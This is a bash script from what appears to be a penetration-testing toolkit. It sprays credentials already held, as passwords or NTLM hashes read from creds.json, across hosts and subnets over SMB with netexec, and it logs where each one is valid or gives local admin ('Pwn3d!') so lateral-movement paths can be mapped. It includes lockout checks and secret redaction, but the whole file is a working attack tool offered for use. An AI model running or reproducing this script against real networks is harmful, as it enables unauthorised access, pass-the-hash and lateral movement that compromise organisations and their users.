#!/usr/bin/env bash
# =============================================================================
#  cred_spray_internal.sh  —  credential-reuse lateral scouting  (ATOMIC)
# =============================================================================
#  Attack-chain role: take a credential you already hold and test it against
#  other hosts to find where it is reused (local-admin or valid logon),
#  mapping lateral-movement opportunities without new exploitation.
#
#  Default: ONE credential (chosen by -u/-d, else the first usable one).
#  --all-creds: iterate EVERY credential in creds.json against the host(s).
#
#  SAFETY: --all-creds applies the same lockout reasoning as spray.sh — if it
#  would try more secrets against a single account than the lockout threshold
#  allows, it refuses (override with --i-know-the-risk). Single-cred mode is one
#  attempt per account, always safe.
#
#  Live summary lines reference a credential by IDENTITY (domain/user), never by
#  printing the secret; master.log redaction still applies throughout.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
cred_spray_internal.sh — reuse a known credential across hosts (ATOMIC)

USAGE:   ./cred_spray_internal.sh [-u user -d domain] [--all-creds] [--hosts file | -t host] [--i-know-the-risk]
EXAMPLE: ./cred_spray_internal.sh -u jdoe -d corp.local --hosts hosts.txt
         ./cred_spray_internal.sh --all-creds -t 10.0.0.0/24

FLAGS:
  -u, --username <user>   pick a single stored credential by username (with -d)
      --all-creds         try EVERY credential in creds.json (opt-in broad sweep)
      --hosts <file>      file of target hosts/CIDRs (else -t / scope.txt)
      --i-know-the-risk   bypass the lockout refusal in --all-creds mode
  -h, --help              this help
  (shared flags -t/-d/--dc-ip/-q: --help-common)

SAFETY: --all-creds refuses if secrets-per-account would reach the lockout
  threshold (same gate as spray.sh). Single-cred mode is always 1/account.
WHAT IT DOES: netexec smb <hosts> with each credential; logs host + identity per
  attempt and a final summary of what worked where. Does not add new creds.
PREREQS: at least one credential in creds.json; target host(s). Needs netexec.
EOF
}

SINGLE_USER="" ALL_CREDS=0 HOSTFILE="" IKNOW=0

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -u|--username) SINGLE_USER="$2"; shift 2 ;;
    --all-creds)   ALL_CREDS=1; shift ;;
    --hosts)       HOSTFILE="$2"; shift 2 ;;
    --i-know-the-risk) IKNOW=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

# Resolve the target host(s): --hosts file wins, else the shared target.
if [[ -n "$HOSTFILE" ]]; then
  [[ -f "$HOSTFILE" ]] || die "hosts file not found: $HOSTFILE"
  TARGETS="$HOSTFILE"
else
  [[ -n "$TARGET" ]] || die "no target: set scope.txt, pass -t <host>, or --hosts <file>"
  TARGETS="$TARGET"
fi

need_cmd netexec
ensure_creds_file

# Build the list of creds to try (TSV: domain \t user \t type \t secret).
declare -a CREDS=()
if [[ "$ALL_CREDS" -eq 1 ]]; then
  mapfile -t CREDS < <(jq -r '.[] | [.domain,.username,.secret_type,.secret_value] | @tsv' "$CREDS_FILE" 2>/dev/null)
else
  if [[ -n "$SINGLE_USER" ]]; then
    row="$(jq -r --arg u "$SINGLE_USER" --arg d "$(resolve_domain)" \
      '[.[] | select(.username==$u and ($d=="" or .domain==$d))][0] // empty
       | [.domain,.username,.secret_type,.secret_value] | @tsv' "$CREDS_FILE" 2>/dev/null)"
    [[ -n "$row" ]] || die "no stored credential for user '${SINGLE_USER}'$([[ -n "$(resolve_domain)" ]] && echo " in domain '$(resolve_domain)'")"
    CREDS=("$row")
  else
    require_creds "$DOMAIN_OVERRIDE"       # first usable; populates SEL_*
    CREDS=("$(printf '%s\t%s\t%s\t%s' "$SEL_DOMAIN" "$SEL_USER" "$SEL_STYPE" "$SEL_SECRET")")
  fi
fi
[[ "${#CREDS[@]}" -gt 0 ]] || die "no credentials in creds.json to spray"

log_begin
log_info "credential-reuse scout: ${#CREDS[@]} credential(s) vs ${TARGETS} ($([[ $ALL_CREDS -eq 1 ]] && echo all-creds || echo single))"

# --- SAFETY GATE (only meaningful for --all-creds) ------------------------
if [[ "$ALL_CREDS" -eq 1 ]]; then
  # Max distinct secrets tried against any single (domain\user) = attempts/account.
  MAXACC="$(jq -r '[.[] | (.domain+"\\"+.username)] | group_by(.) | map(length) | max // 0' "$CREDS_FILE" 2>/dev/null)"
  MAXACC="${MAXACC:-1}"
  run_cmd "netexec smb ${DC:-$TARGET} -u '' -p '' --pass-pol" || true
  POL="$LAST_OUTPUT"
  if grep -qi 'lockout' <<<"$POL"; then
    spray_safe_or_die "$MAXACC" "$POL" "$IKNOW"
  elif [[ "$MAXACC" -le 1 ]]; then
    log_info "could not read lockout policy, but ≤1 secret/account → safe"
  elif [[ "$IKNOW" -eq 1 ]]; then
    log_warn "lockout policy unreadable; up to ${MAXACC} secrets/account — proceeding due to --i-know-the-risk"
  else
    die "REFUSING: lockout policy unreadable and up to ${MAXACC} secrets/account would be tried. Verify the policy, then re-run with --i-know-the-risk."
  fi
fi

# --- SCOUT ----------------------------------------------------------------
declare -a WORKED=()
for row in "${CREDS[@]}"; do
  IFS=$'\t' read -r cdom cuser ctype csecret <<<"$row"
  [[ -z "$cuser" ]] && continue
  secret_track "$csecret"
  case "$ctype" in
    password)  cauth="$(printf -- '-u %q -p %q' "$cuser" "$csecret")" ;;
    ntlm_hash) cauth="$(printf -- '-u %q -H %q' "$cuser" "$csecret")" ;;
    aes_key)   cauth="$(printf -- '-u %q -p %q' "$cuser" "$csecret")" ;;  # smb has no aes; best-effort
    *) log_warn "skipping ${cdom}/${cuser}: unknown secret_type '${ctype}'"; continue ;;
  esac
  log_info "trying ${cdom}/${cuser} (${ctype}) against ${TARGETS}"   # identity only — no secret
  run_cmd "netexec smb ${TARGETS} ${cauth} --continue-on-success"
  if grep -qi 'STATUS_ACCOUNT_LOCKED_OUT' <<<"$LAST_OUTPUT"; then
    log_err "lockouts observed (STATUS_ACCOUNT_LOCKED_OUT) — stopping immediately"
    break
  fi
  while IFS= read -r l; do
    [[ "$l" == *'[+]'* ]] || continue
    host="$(awk '{print $2}' <<<"$l")"
    pwned=""; [[ "$l" == *'(Pwn3d!)'* ]] && pwned=" (admin/Pwn3d!)"
    WORKED+=("${cdom}/${cuser} @ ${host}${pwned}")
    log_ok "valid: ${cdom}/${cuser} on ${host}${pwned}"
  done <<< "$LAST_OUTPUT"
done

# --- SUMMARY --------------------------------------------------------------
master_raw "  --- credential-reuse summary ---"
if [[ "${#WORKED[@]}" -gt 0 ]]; then
  for w in "${WORKED[@]}"; do log_ok "reuse: $w"; done
else
  log_warn "no credential validated on any target"
fi
log_end "success"
